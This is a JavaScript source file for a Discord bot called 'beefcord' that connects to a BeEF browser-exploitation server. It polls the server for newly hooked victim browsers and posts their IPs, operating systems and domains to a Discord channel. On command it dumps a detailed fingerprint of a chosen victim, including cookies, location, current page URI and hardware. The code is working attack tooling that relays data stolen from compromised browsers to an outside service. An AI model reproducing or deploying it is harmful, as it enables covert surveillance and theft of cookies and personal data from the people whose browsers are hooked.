const {
  Client,
  Intents
} = require('discord.js');
var request = require('request');
const fs = require('fs');

const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES]
});

const beefDomain = "localhost";
const beefPort = "3000";
const BeefToken = '';
const channelId = '';
const filePath = './tmpFile/client_ids';
const lastOut = './tmpFile/last_send';




let lastFileContent = '';

client.on('ready', () => {
  console.log(`Bot conectado como ${client.user.tag}`);
});

function callback(error, response, body) {

  if (!error && response.statusCode === 200) {
      let data = JSON.parse(body);
      const onlineCount = Object.keys(data['hooked-browsers']['online']).length;
      if (lastFileContent !== onlineCount.toString()) {
        for (const key in data['hooked-browsers']['online']) {
          const element = data['hooked-browsers']['online'][key];
          fs.appendFileSync('./tmpFile/last_send', `:[beefcord|host]: HookID: ${element.id} IP: ${element.ip} OS: ${element.os} DOMAIN: ${element.domain}  \n`);
        }              
      }
      

      fs.writeFile(filePath, onlineCount.toString(), function(err) {
          if (err) {
              console.log(err);
          }
      });



  } else {
      console.log(error);
  }
}

client.on('messageCreate', async message => {   
  if (message.author.bot) {
    return; // Ignorar mensajes del propio bot
  }
  if (message.content.startsWith('!showhost')) {
    const args = message.content.slice('!showhost'.length).trim().split(/ +/);
    const id = parseInt(args[0]);

    if (isNaN(id)) {
      message.reply(`:[beefcord|error]: '${args[0]}' invalid.`);
      return;
    }

    const options = {
      url: `http://${beefDomain}:${beefPort}/api/hooks?token=${BeefToken}`
    };

    request(options, function(error, response, body) {
      if (!error && response.statusCode === 200) {
        const data = JSON.parse(body);
        const online = data["hooked-browsers"]["online"];
        //console.log(online);

        let element = null;
        for (const key in online) {
          if (online.hasOwnProperty(key) && online[key].id === id) {
            element = online[key];
            break;
          }
        }
        
        //const element = data.find(e => e.id === id);
    
        if (element) {
          message.reply(` 'session' for ID: ${id} is: ${element.session}`);
          const url_b_data = `http://${beefDomain}:${beefPort}/api/hooks/${element.session}?token=${BeefToken}`;
          const channel = client.channels.cache.get(channelId);
          
            request.get(url_b_data, (error_bro, response_bro, body_bro) => {
              if (!error_bro && response_bro.statusCode === 200) {
                 
                const data_bro = JSON.parse(body_bro);

                //console.log(data_bro);
                //channel.send(`:[beefcord|bro_data]:\n\`\`\`${data_bro['network.ipaddress']}\`\`\``);
                
channel.send(`:[beefcord|bro_data]:\n\`\`\`
location.city : ${data_bro['location.city']} \n
location.country : ${data_bro['location.country']} \n
network.proxy : ${data_bro['network.proxy']} \n
network.proxy.client : ${data_bro['network.proxy.client']} \n
browser.name.reported : ${data_bro['browser.name.reported']} \n
browser.engine : ${data_bro['browser.engine']} \n
browser.language : ${data_bro['browser.language']} \n
browser.window.cookies : ${data_bro['browser.window.cookies']} \n
host.os.name : ${data_bro['host.os.name']} \n
host.os.family : ${data_bro['host.os.family']} \n
host.os.version : ${data_bro['host.os.version']} \n
host.os.arch : ${data_bro['host.os.arch']} \n
host.software.defaultbrowser : ${data_bro['host.software.defaultbrowser']} \n
hardware.type : ${data_bro['hardware.type']} \n
browser.date.datestamp : ${data_bro['browser.date.datestamp']} \n
browser.window.title : ${data_bro['browser.window.title']} \n
browser.window.origin : ${data_bro['browser.window.origin']} \n
browser.window.uri : ${data_bro['browser.window.uri']} \n
browser.window.referrer : ${data_bro['browser.window.referrer']} \n
browser.window.hostname : ${data_bro['browser.window.hostname']} \n
browser.window.hostport : ${data_bro['browser.window.hostport']} \n
browser.plugins : ${data_bro['browser.plugins']} \n
browser.platform : ${data_bro['browser.platform']} \n
hardware.screen.colordepth : ${data_bro['hardware.screen.colordepth']} \n
hardware.screen.size.width : ${data_bro['hardware.screen.size.width']} \n
hardware.screen.size.height : ${data_bro['hardware.screen.size.height']} \n
browser.window.size.height : ${data_bro['browser.window.size.height']} \n
browser.window.size.width : ${data_bro['browser.window.size.width']} \n
hardware.memory : ${data_bro['hardware.memory']} \n
hardware.gpu : ${data_bro['hardware.gpu']} \n
hardware.gpu.vendor : ${data_bro['hardware.gpu.vendor']} \n
hardware.cpu.arch : ${data_bro['hardware.cpu.arch']} \n
hardware.cpu.cores : ${data_bro['hardware.cpu.cores']} \n
hardware.battery.level : ${data_bro['hardware.battery.level']} \n
hardware.screen.touchenabled : ${data_bro['hardware.screen.touchenabled']}\`\`\``);

              } else {
                console.error(`:[beefcord|error]: ${error_bro}`);
              }
            });

        } else {
          message.reply(`:[beefcord|error]: NO ID ${id}`);
        }
      } else {
        console.error(`Error al obtener datos: ${error}`);
        message.reply(':[beefcord|error]:');
      }
    });
    
  }
});


setInterval(() => {
  fs.readFile(filePath, 'utf8', (err, data) => {
      if (err) {
          console.error(err);
          return;
      }


      if (data !== lastFileContent) {
          //console.log(data);
          lastFileContent = data;
          const message = `:[beefcord]: Nuevos clientes detectados!`;
          const channel = client.channels.cache.get(channelId);
          const lastSendContent = fs.readFileSync(lastOut, 'utf8');

          if (channel) {
                  channel.send(`:[beefcord|hooks-list]:\n\`\`\`${lastSendContent}\`\`\``);
          } else {
              console.error(`No se pudo encontrar el canal con ID ${channelId}`);
          }
      }

      const options = {
          url: `http://${beefDomain}:${beefPort}/api/hooks?token=${BeefToken}`
      };
      request(options, callback);

  });


}, 5000);

// Start DISCORD bot
client.login('YOUR-DISCORD-TOKEN-HERE');
